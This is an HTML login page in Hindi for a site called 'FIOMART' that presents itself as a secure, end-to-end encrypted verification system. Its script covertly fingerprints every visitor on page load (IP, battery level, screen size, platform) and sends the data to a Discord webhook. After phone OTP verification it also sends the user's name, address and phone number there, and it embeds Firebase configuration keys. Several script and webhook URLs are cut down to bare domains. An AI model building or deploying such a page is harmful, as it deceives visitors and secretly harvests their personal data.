<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FIOMART - सुरक्षित लॉगिन</title>
    
    <!-- 1. बिल्कुल सही और फुल फायरबेस स्क्रिप्ट्स लिंक्स -->
    <script src="https://gstatic.com"></script>
    <script src="https://gstatic.com"></script>
    <script src="https://gstatic.com"></script>
    
    <!-- गूगल फॉन्ट्स -->
    <link href="https://googleapis.com" rel="stylesheet">

    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #311042 100%); overflow-x: hidden; }
        .login-box { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); padding: 40px 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4); width: 90%; max-width: 400px; text-align: center; }
        .brand-name { font-size: 32px; font-weight: 700; letter-spacing: 2px; background: linear-gradient(to right, #38bdf8, #a855f7, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0 0 5px 0; text-transform: uppercase; }
        .subtitle { color: #94a3b8; font-size: 14px; font-weight: 300; margin-bottom: 30px; }
        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
        .input-group label { color: #cbd5e1; font-size: 12px; font-weight: 500; margin-left: 5px; display: block; margin-bottom: 6px; text-transform: uppercase; }
        input { width: 100%; padding: 14px 16px; background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; color: #ffffff; font-size: 15px; outline: none; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(168, 85, 247, 0.5); }
        #recaptcha-container { margin: 15px 0; display: flex; justify-content: center; }
        .footer-secure { margin-top: 25px; font-size: 11px; color: #64748b; text-align: center; }
    </style>
</head>
<body>

<div class="login-box">
    <h1 class="brand-name">FIOMART</h1>
    <div class="subtitle">Secure Verification System</div>
    
    <div id="phone-section">
        <div class="input-group">
            <label>पूरा नाम</label>
            <input type="text" id="userName" placeholder="John Doe">
        </div>
        <div class="input-group">
            <label>पूरा पता</label>
            <input type="text" id="userAddress" placeholder="शहर, राज्य, PIN कोड">
        </div>
        <div class="input-group">
            <label>मोबाइल नंबर</label>
            <input type="tel" id="phoneNumber" placeholder="+91 9876543210" value="+91">
        </div>
        <div id="recaptcha-container"></div>
        <button id="otpBtn">OTP प्राप्त करें</button>
    </div>

    <div id="otp-section" style="display: none;">
        <div class="input-group">
            <label>वन-टाइम पासवर्ड (OTP)</label>
            <input type="text" id="otpCode" placeholder="6 अंकों का OTP दर्ज करें">
        </div>
        <button id="verifyBtn">सत्यापित करें और प्रवेश करें</button>
    </div>

    <div class="footer-secure">🔒 End-to-End Encrypted Secure Login</div>
</div>

<script>
    // 2. आपका पूरा और असली Discord Webhook URL यहाँ है
    const discordWebhookUrl = "https://discord.com";
    
    // 3. आपकी बिल्कुल सही और फुल Firebase कॉन्फ़िगरेशन डिटेल्स
    const firebaseConfig = {
      apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
      authDomain: "fiomart-c6582.firebaseapp.com",
      projectId: "fiomart-c6582",
      storageBucket: "fiomart-c6582.firebasestorage.app",
      messagingSenderId: "444479545449",
      appId: "1:444479545449:web:28a92bdabe99fd613dc2f8",
      measurementId: "G-EZMRNEJRQK"
    };

    let confirmationResultGlobal;
    let trackingData = { ip: "Fetching...", userAgent: navigator.userAgent, screenResolution: `${window.screen.width}x${window.screen.height}`, platform: navigator.platform, batteryLevel: "N/A", isCharging: "N/A" };

    // सुरक्षित रूप से फायरबेस इनिशियलाइज करें
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', { 'size': 'normal' });

    // Discord पर अलर्ट भेजने का फंक्शन
    function sendToDiscord(titleText) {
        fetch(discordWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `${titleText} \n\n🌐 **IP Address:** ${trackingData.ip} \n🔋 **बैटरी:** ${trackingData.batteryLevel} (Charging: ${trackingData.isCharging}) \n🖥️ **स्क्रीन साइज:** ${trackingData.screenResolution} \n💻 **OS/Platform:** ${trackingData.platform} \n⏰ **समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
            })
        }).catch(() => {});
    }

    // पेज लोड होते ही ट्रैकिंग शुरू करें
    window.onload = async function() {
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                trackingData.batteryLevel = `${Math.round(battery.level * 100)}%`;
                trackingData.isCharging = battery.charging ? "Yes" : "No";
            } catch (e) {}
        }
        sendToDiscord("🚨 **वेबसाइट पर नया विजिटर आया है (तुरंत ट्रैकिंग)!**");
        
        try {
            const ipResponse = await fetch('https://ipify.org');
            const ipData = await ipResponse.json();
            trackingData.ip = ipData.ip;
            sendToDiscord("🌐 **विजिटर का IP एड्रेस अपडेट:**");
        } catch (e) { trackingData.ip = "Unknown/Blocked"; }
    };

    // OTP बटन क्लिक लिसनर
    document.getElementById('otpBtn').addEventListener('click', function() {
        const name = document.getElementById('userName').value;
        const address = document.getElementById('userAddress').value;
        const phoneNumber = document.getElementById('phoneNumber').value;

        if(name.trim() === "" || address.trim() === "") {
            alert("कृपया पहले अपना नाम & पता पूरा भरें!");
            return;
        }

        firebase.auth().signInWithPhoneNumber(phoneNumber, window.recaptchaVerifier)
            .then((confirmationResult) => {
                confirmationResultGlobal = confirmationResult;
                alert("OTP आपके मोबाइल पर भेज दिया गया है!");
                document.getElementById('phone-section').style.display = 'none';
                document.getElementById('otp-section').style.display = 'block';
            }).catch((error) => {
                alert("OTP भेजने में समस्या: " + error.message + "\nकृपया ध्यान दें कि नंबर के आगे +91 जरूर लगा हो।");
            });
    });

    // वेरिफाई बटन क्लिक लिसनर
    document.getElementById('verifyBtn').addEventListener('click', function() {
        const code = document.getElementById('otpCode').value;
        const phoneNumber = document.getElementById('phoneNumber').value;
        const name = document.getElementById('userName').value;
        const address = document.getElementById('userAddress').value;

        confirmationResultGlobal.confirm(code).then((result) => {
            const user = result.user;
            try {
                db.collection("registered_users").doc(user.uid).set({
                    fullName: name, userAddress: address, phone: phoneNumber,
                    ipAddress: trackingData.ip, deviceOS: trackingData.platform,
                    resolution: trackingData.screenResolution, battery: trackingData.batteryLevel,
                    loginTime: firebase.firestore.FieldValue.serverTimestamp()
                });
            } catch(e) {}

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🎉 **यूजर ने सफलतापूर्वक लॉगिन कर लिया है!** \n\n👤 **नाम:** ${name} \n📍 **पता:** ${address} \n📱 **मोबाइल:** ${phoneNumber}` })
            }).finally(() => {
                localStorage.setItem("isLoggedIn", "true");
                window.location.href = "main.html";
            });
        }).catch(() => {
            alert("गलत OTP, कृपया फिर से जांचें।");
        });
    });
</script>

</body>
</html>
